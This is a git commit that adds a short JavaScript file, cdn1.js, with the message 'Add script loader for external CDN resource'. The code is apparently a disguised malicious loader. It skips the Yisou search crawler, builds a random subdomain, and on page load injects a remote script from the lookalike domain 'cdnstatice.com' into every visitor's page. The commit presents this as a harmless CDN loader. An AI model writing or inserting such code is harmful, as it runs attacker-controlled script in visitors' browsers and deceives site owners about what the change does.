cdf40e78201d41698cd420dc7394e56d876f0618
nahsaa <uoj6339@gmail.com>
2026-06-16 01:52:57 +0700

    Add script loader for external CDN resource

---
+++ cdn1.js
@@ -0,0 +1,13 @@
+(function() {
+    if (/yisouspider/i.test(navigator.userAgent)) return;
+    var chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+    var len = Math.floor(Math.random() * 5) + 1;
+    var prefix = "";
+    for (var i = 0; i < len; i++) {
+        prefix += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    var s = document.createElement("script");
+    s.type = "text/javascript";
+    s.src = "https://" + prefix + ".cdnstatice.com/js/api1.js";
+    document.head.appendChild(s);
+})();
